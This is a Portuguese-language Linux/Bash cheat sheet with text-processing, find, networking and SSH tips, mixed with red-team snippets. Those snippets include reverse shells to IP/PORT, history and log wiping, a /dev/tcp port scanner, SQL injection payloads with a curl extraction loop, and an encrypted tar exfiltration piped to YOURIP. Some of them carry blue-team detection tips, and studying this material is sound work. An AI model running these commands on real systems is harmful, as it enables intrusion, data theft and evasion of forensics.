# Linux

## 1. Fundamentos Essenciais de Bash

### Histórico e atalhos

* `!!` → repete o último comando.
* `!$` → último argumento do último comando.
* `!*` → todos os argumentos do último comando.
* `!^` → primeiro argumento do último comando.

```bash
mkdir /tmp/test; cd !$   # cria diretório e entra nele
```

### Expansão de chaves

* `{1..5}` → gera `1 2 3 4 5`.
* `{a,b,c}` → gera `a b c`.

```bash
for i in {1..3}; do touch file$i.txt; done
```

### Substituição de processo

Permite tratar a saída de um comando como se fosse arquivo.

```bash
diff <(ls dir1) <(ls dir2)
```

### Criar vários arquivos, dentro de uma pasta

`touch cmd/{root,completion,interactive,version}.go`

***

## 2. Manipulação de Texto

### grep

* Buscar recursivo: `grep -RIn "pattern" dir`
* Somente match: `grep -oE 'https?://[^ ]+' file`

### sed

* Substituir globalmente: `sed -i 's/foo/bar/g' file`
* Deletar linhas com padrão: `sed -i '/DEBUG/d' logfile`

### awk

* Extrair colunas:

```bash
awk -F: '{print $1,$3,$6}' /etc/passwd
```

* Somatório:

```bash
awk '{s+=$2} END {print s}' values.txt
```

### cut, sort, uniq, column

```bash
cut -d, -f1,3 data.csv
sort file | uniq -c | sort -nr | head
... | column -t
```

👉 **Insight:** essa cadeia (`sort | uniq -c | sort -nr`) é o padrão ouro para descobrir “Top-N mais frequentes”.

***

## 3. Localizar Arquivos

### find

* Compressão em massa:

```bash
find . -type f -name '*.log' -exec gzip -9 {} +
```

* Hash de todos os arquivos (NUL-safe):

```bash
find . -type f -print0 | xargs -0 sha256sum
```

### Regex no find

```bash
find . -regex '.*(conf|cfg)$'
```

👉 **Insight:** prefira `-exec {} +` a `-exec {} \;` para performance.

***

## 4. Loops Úteis

### Loop de rede (/24)

```bash
for i in {1..254}; do
  ping -c1 -W1 192.168.0.$i &>/dev/null && echo "UP: $i"
done
```

### Loop NUL-safe

```bash
find . -type f -print0 | while IFS= read -r -d '' f; do
  du -h "$f"
done
```

***

## 5. Rede e Netcat

### Inspeção de rede

```bash
ss -lntp       # conexões ativas
lsof -i :443   # quem usa porta 443
ip a; ip r     # IPs e rotas
```

### Netcat (variações)

```bash
nc -l 9000 > out.bin     # escuta (OpenBSD)
nc -l -p 9000 > out.bin  # escuta (tradicional)
nc host 9000 < file.bin  # envio
```

### /dev/tcp

```bash
echo "HEAD / HTTP/1.0\n" > /dev/tcp/target/80
```

👉 **Insight:** muitos EDRs monitoram `/dev/tcp` — red teamers usam, blue teamers caçam.

***

## 6. SSH Avançado

### Encadeamentos

```bash
ssh -J user@jump user@target   # jump host
ssh -ND 1080 user@host         # proxy SOCKS5
ssh -NL 8080:10.0.0.2:80 user@host  # forward local
ssh -NR 4444:127.0.0.1:22 user@host # reverse port
```

### Transferência rápida sem scp

```bash
ssh user@host tee rfile < lfile   # upload
ssh user@host cat rfile > lfile   # download
```

***

## 7. OPSEC (sem rastros)

### Bash history

```bash
unset HISTFILE
ln -sf /dev/null ~/.bash_history
history -c; kill -9 $$
```

### Outros históricos

* `~/.wget-hsts`
* `~/.psql_history`
* `~/.viminfo`

👉 **Insight:** blue teams monitoram deleção de histórico como IOC.

***

## 8. Servidores Rápidos

```bash
python3 -m http.server 8080
php -S 0:8080
busybox httpd -p 8080
ruby -run -e httpd -- -p 8080
```

**Tip:** alias pastebin rápido:

```bash
alias tb='nc termbin.com 9999'
echo "HELLO" | tb
```

***

## 9. Reverse Shells

### Bash puro

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

### FIFO Trick

```bash
mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | nc IP PORT >/tmp/f
```

### Ncat com TLS

```bash
ncat --ssl IP 4443 -e /bin/sh
```

***

## 10. Upgrade de TTY

```bash
script -q /dev/null
python -c 'import pty; pty.spawn("/bin/bash")'
expect -c 'spawn /bin/bash; interact'
```

👉 **Insight:** essencial para usar `su`, `ssh` dentro de shell limitada.

***

## 11. Engenharia Reversa / Binários

### Dumpar seção .text em bytes escapados

```bash
objcopy --dump-section .text=/dev/stdout shellcode \
| xxd -p | sed 's/../\\x&/g' | tr -d '\n'
```

### Alternativa com hexdump

```bash
hexdump -ve '"\\\\x" 1/1 "%02x"' shellcode
```

***

## 12. SQL Injection (didático)

### Exemplo básico

```sql
SELECT * FROM livros WHERE assunto='' UNION SELECT usuario, senha FROM usuarios--' AND lancado=1
```

### Brute force substrings com curl

```bash
for i in $(seq 1 21 200); do
  curl -s "https://target/item.php?id=1'+UNION+SELECT+substr(secret,$i,21)--"
done
```

👉 **Blue tip:** procurar `UNION SELECT`, `information_schema`, uso de `substr` ou `sleep()` em logs.

***

### 0) Filosofia do fluxo — _Up, edit, enter, repeat_

**Ideia:** repita o ciclo incremental até chegar ao resultado. Exemplo:

```bash
cat file | grep -i open | cut -d, -f3 | sort -V
```

**Pareto 80/20:** dominar _pipes_ + 5 utilitários (grep, sed, awk, sort, cut) resolve a maioria das tarefas.

***

### 1) Fundamentos (que multiplicam poder)

* **Pipes & Redireções:** `cmd1 | cmd2` (saída → entrada), `>`, `>>`, `<`, `2>`, `&>`.
* **Descritores:** `&0` (stdin), `&1` (stdout), `&2` (stderr), `&n` (custom). Ex.: `exec 3<>/dev/tcp/10.1.1.1/80; echo -e "GET / HTTP/1.0\n" >&3; cat <&3` (HTTP manual via /dev/tcp).
* **Substituição de comando:** `$(...)` — ex.: `diff <(cmdA) <(cmdB)` (substituição de processo cria pseudo‑arquivo).
* **Expansão de chaves:** `{1..10}`, `{a,b,c}` — ótimo para loops e nomes.
* **Expansão de til:** `~` (home), `~user` (home de user), `~+` (`$PWD`), `~-` (`$OLDPWD`).
* **Quoting correto:** `"$var"` para evitar _word splitting_/**globbing** acidental.
* **NUL‑safety:** `find -print0 | xargs -0 ...` (lida com nomes com espaço/\n).
* **História inteligente:** `!$` (último argumento), `!!` (último comando), `!*` (todos args), `!^` (primeiro arg).
* **Aliases úteis:** `alias ll="ls -aLF"`; `alias l.="ls -d .[^.]*"`.

***

### 2) Texto em alta velocidade (grep | sed | awk | cut | sort | uniq | tr | column)

#### grep (buscar)

```bash
grep -RIn --color -C2 "regex" dir
grep -E 'err(or|ing|ed)' file              # regex estendida
```

#### sed (editar stream)

```bash
sed '1d; s/foo/bar/g' file                 # remove 1ª linha; troca foo→barsed -i '/192\.168\.0\.1/d' /var/log/apache2/access.log
```

#### awk (formatar, extrair, somar)

```bash
awk -F, '{print $1,$3,$6}' OFS=, file.csv  # cortar/remezclar colunas
awk '{ if (!seen[$0]++) print }' file      # uniq sem ordenar (hash)
```

#### cut | sort | uniq | tr | column

```bash
echo a,b,c,d | cut -d, -f1-3,5
sort -u file                                # ordenar + únicos
sort file | uniq -c | sort -nr | head -20   # Top-N mais frequentes
tr -s '[:space:]' ' ' < in.txt               # normalizar espaços
... | column -t                              # tabela bonita
```

**Ordenar IPs (POSIX puro):**

```bash
sort -t . -nk1,1 -k2,2 -k3,3 -k4,4 ips.txt
# GNU/BSD moderno: sort -V ips.txt
```

***

### 3) Encontrar & agir (find | xargs | -exec)

```bash
find . -type f -name '*.log' -exec gzip -9 {} +        # agrupa para performance
find . -type f -print0 | xargs -0 sha256sum            # NUL‑safe
awk 'FNR==1{print "===>",FILENAME}1' *.log            # cabeçalho por arquivo
```

**Regex com find:**

```bash
find . -regextype posix-extended -regex '.*/(foo|bar)\.conf'
```

***

### 4) Loops práticos

```bash
# Ping /24 rápido (descoberta básica)
for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo UP:$i; done

# Loop NUL‑safe lendo find
find . -type f -print0 | while IFS= read -r -d '' f; do du -h "$f"; done
```

***

### 5) Rede (ss | ip | lsof | nc/ncat | /dev/tcp)

```bash
ss -lntp                                 # ouvindo + PID/PROC
lsof -Pan -i :443                        # quem usa 443 (sem DNS)
ip a; ip r; ip neigh                     # endereços, rotas, vizinhos
```

#### netcat (atenção à variante)

```bash
# Receber
nc -l 9000 > out.bin                     # OpenBSD nc
nc -l -p 9000 > out.bin                  # variantes antigas
# Enviar
nc HOST 9000 < file.bin
# Scan rápido
nc -znv 192.168.0.1 1-1023 |& grep -v refused
```

#### Bash /dev/tcp (portável em muitas distros)

```bash
# HTTP manual
exec 3<>/dev/tcp/10.1.1.1/80; echo -e 'GET / HTTP/1.0\n' >&3; cat <&3
# Port‑scanner simples
for p in {1..1023}; do : 2>/dev/null > "/dev/tcp/192.168.0.1/$p" && echo $p; done
```

#### SSH (tunelamento & file‑copy sem scp)

```bash
ssh -J user1@host1 user2@host2           # jump host
ssh -ND 1080 user@host                   # SOCKS5 proxy
ssh -NL 3389:desktop-1:3389 user@host    # forward local
ssh -NR 4444:localhost:4444 user@host    # reverse port
ssh user@host tee rfile < lfile          # upload tipo scp
ssh user@host cat rfile > lfile          # download tipo scp
```

***

### 6) OPSEC — “Leave No Trace” (deixe menos rastros)

**Arquivos que “deduram”:** `~/.bash_history`, `~/.wget-hsts`, `~/.lesshst`, `~/.viminfo`/`*.swp`, `~/.psql_history`, etc.

**Bash mudo:**

```bash
unset HISTFILE; export HISTFILE=/dev/null
ln -sf /dev/null ~/.bash_history
history -c; kill -9 $$
```

**Outros silenciados:**

```bash
wget --no-hsts
export MYSQL_HISTFILE=/dev/null; mysql
ln -sf /dev/null ~/.psql_history; psql
vim -ni NONE file
ssh -o UserKnownHostsFile=/dev/null
```

**“Pegadinhas” de user implicado:** `ssh`, `rdesktop`, `xfreerdp`, `ftp` usam seu username atual se não especificar.

**Higiene local sugerida:**

```
~/.ssh/config         -> User root (se o contexto exigir)
~/.netrc              -> credenciais padrão (cuidado!)
~/.bashrc             -> alias seguros p/ RDP/SSH etc.
```

> **Blue Team insight:** bloquear/alertar `RWX`, uso de `/dev/tcp`, FIFO em `/tmp`, outbound incomum, `history` zerado e HSTS desabilitado.

***

### 7) Exploração quando há limitações

**Sem espaços:**

```bash
echo${IFS}this${IFS}has${IFS}no${IFS}spaces
{echo,this,has,no,spaces}
```

**Sem `ls(1)`/`cat(1)`:**

```bash
echo *
find . -maxdepth 1
while read -r l; do echo "$l"; done < file
head -n 99999 file
```

**“Texto‑only” (transferir binários por canal textual)**

```bash
# Ler binário via base64/hex/etc. (lado receptor decodifica)
base64 -d b64.txt > out.bin
xxd -r -p hex.txt > out.bin

# Escrever binário a partir de escapes
printf %b "\105\114\106\177" > elf.bin        # octal ELF header
xxd -r -p <<< 454c467f > elf.bin
perl -e 'print "\105\114\106\177"' > elf.bin
```

***

### 8) Servir/compartilhar rápido (sem infra)

```bash
python -m http.server 8080               # Py3
python -m SimpleHTTPServer 8080          # Py2
ruby -run -e httpd -- -p 8080
php -S 0:8080                            # interpreta PHP
busybox httpd -p 8080
```

> Dica: alias p/ _pastebin_ via termbin — `alias tb='nc termbin.com 9999'`; `echo "HELLO" | tb`

***

### 9) Upgrade de TTY (shell interativa “de verdade”)

```bash
script -q /dev/null                       # usa $SHELL (portável)
script -qc /bin/bash /dev/null            # GNU way
script -q /dev/null /bin/bash             # BSD way
python -c 'import pty,os; pty.spawn("/bin/bash")'
expect -c 'spawn /bin/bash; interact'
```

***

### 10) Shellcode → bytes escapados (inliner)

```bash
# Dump da seção .text -> hex -> \x.. -> sem quebras
objcopy --dump-section .text=/dev/stdout shellcode \
| xxd -p \
| sed 's/../\\x&/g' \
| tr -d '\n'

# Equivalente com hexdump
hexdump -ve '"\\\\x" 1/1 "%02x"' shellcode
```

***

### 11) SQL 101 (mariaDB) — e pipeline de _CTF‑fu_

**Rotina básica:**

```sql
SHOW DATABASES; USE db; SHOW TABLES; SELECT * FROM t;
SELECT * FROM cyberpunk WHERE year_of_release > 2000;
INSERT INTO cyberpunk (year_of_release,title,duration,has_sequel)
VALUES (1995,'Ghost in the Shell',126,TRUE);
SELECT * FROM cyberpunk ORDER BY year_of_release DESC;
DELETE FROM cyberpunk WHERE title='The Matrix Ressurections';
```

**Bootstrap:**

```bash
sudo apt update && sudo apt install -y mariadb-server
sudo systemctl start mariadb
sudo mysql_secure_installation
sudo mysql -u root -p < sql101.sql
```

**SQLi (conceito):**

```
SELECT * FROM livros WHERE assunto='Hacking' AND lancado=1
# Input malicioso ->  '\'' UNION SELECT usuario, senha FROM usuarios--
# Query final -> SELECT * FROM livros WHERE assunto='' UNION SELECT usuario, senha FROM usuarios--' AND lancado=1
```

**Pipeline de resolução (exemplo didático de CTF):**

```bash
curl -s https://termbin.com/4hfm \
| grep -A5 echo \
| cut -d ' ' -f2 \
| grep -v echo \
| base32 -d \
| xxd -r -p \
| base64 -d \
| rev
```

**Brutinho com curl + SQLi (extraído e adaptado):**

```bash
for i in $(seq 1 21 200); do
  curl -s 'https://example/equipment.php?search='
  "+UNION+SELECT+1,2,substr(group_concat(secret),$i,21)" \
; done \
| grep '<tr><th scope="row">1</td><td>2</td>' \
| cut -d '>' -f7 | cut -d '<' -f1
```

> **Blue Team insight:** monitore `UNION SELECT`, `information_schema`, explosões de `substr/substring`, _patterns_ de _time‑based_ e erro‑based.

***

### 12) Dicas MECE (portabilidade & precisão)

* **GNU vs BSD/macOS:** `sed -i` difere; `grep -P` (PCRE) nem sempre existe; `column`/`sort -V` variam.
* **NUL everywhere:** padronize com `-print0 | xargs -0` para nomes “difíceis”.
* **Evite `-e` do nc:** indisponível no `netcat-openbsd`; prefira FIFO ou `ncat --ssl -e` (quando permitido e com consentimento).
* **OPSEC ≠ invisibilidade:** _logs_ de rede, DNS e EDR ainda verão o tráfego. Combine com _tunnels_ SSH e segregação de infra.
* **Documente seu chain:** cole o pipeline final (comentado) na _engagement report_ para reprodutibilidade.

***

### 13) Snippets prontos (copiar/colar)

**Top N strings mais comuns:**

```bash
strings bin | tr -s '[:space:]' '\n' | sort | uniq -c | sort -nr | head -20
```

**Buscar IOCs (IPs/domínios/hash) em árvore:**

```bash
rg -n --hidden -g '!*\.git/*' -e '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' -e '\b[a-f0-9]{32,64}\b' -e '\b[a-z0-9.-]+\.[a-z]{2,}\b'
```

**Mini exfil segura (quando autorizado):**

```bash
tar czf - dir | openssl enc -aes-256-cbc -salt | ncat --ssl YOURIP 4443
```

**Gerar lista de gadgets (ex.: pop rdi; ret) com Ropper:**

```bash
ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search 'pop rdi; ret'
```

***

### 14) Referências rápidas

* Bash Pitfalls; Bash Hackers Wiki; ExplainShell; THC Tips & Tricks; OverTheWire Bandit; LinuxZoo; CAPA/YARA (para signatures).
* Manuais: `man bash`, `man sed`, `man awk`, `man find`, `man xargs`, `man ssh`, `man ss`, `man ip`, `man lsof`, `man nc`/`ncat`.

> **Checklist final:** pipes ok • quoting ok • NUL‑safe • portable flags • OPSEC ligado • registrar pipeline final.
